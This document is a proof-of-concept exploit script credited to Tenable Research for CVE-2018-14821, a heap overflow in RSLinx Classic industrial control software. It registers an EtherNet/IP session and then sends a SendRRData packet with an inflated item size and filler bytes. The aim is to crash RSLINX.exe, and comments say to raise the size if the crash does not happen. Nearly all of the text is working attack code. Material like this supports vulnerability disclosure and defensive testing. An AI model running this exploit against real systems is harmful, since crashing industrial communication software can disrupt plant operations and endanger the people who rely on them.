##
# Exploit Title: RSLinx Classic - heap overflow
# Date: 06/11/2019
# Exploit Author: Tenable Research
# CVE : CVE-2018-14821
# Advisory: https://www.tenable.com/security/research/tra-2018-26
# Affected Vendors/Device/Firmware:
#  - RSLinx Classic 4.00.01 and earlier
##

import sys, socket, binascii
from struct import *

def usage():
  print "usage  : "+sys.argv[0] + " <target_ip>  <target_port>"
  print "example: "+sys.argv[0] + " 192.168.1.123 44818"

def mk_msg(cmd, dlen=None,session=0, status=0, sender='\x00'*8, options=0, data=''):
  if dlen is None: dlen = len(data)
  return pack('<HHLL8sL', cmd, dlen, session, status, sender, options) + data

def mk_type(id, size=None, data=''):
  if size is None: size = len(data)
  return pack('<HH', id, size) + data 
   
  
if len(sys.argv) != 3:
  usage()
  sys.exit()

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((host, port))

# Register Session
msg = mk_msg(cmd=0x65,data=pack('<HH',1,0))
s.send(msg)
res = s.recv(1024)
print binascii.hexlify(res)
cmd, dlen, session, status, sender, options = unpack('<HHLL8sL',res[0:24])
if(cmd != 0x65 or status != 0):
  print 'RegisterSession command failed.'
  s.close();
  sys.exit()


data =  pack('<L',0)        # interface
data += pack('<H',0)        # timeout 
data += pack('<H',2)        # number of Type IDs 
data += mk_type(0)

max = 4500 - len(data) - 4;

# Large 'size' can cause heap oveflow
# increase the 'size' value if it does not crash RSLINX.exe 
data += mk_type(id=0xb2, data='A' * max, size=0x1fff) 

msg = mk_msg(cmd=0x6f,session=session,data=data)
s.send(msg)
# RSLINX.exe should die
res = s.recv(1024)
print binascii.hexlify(res)
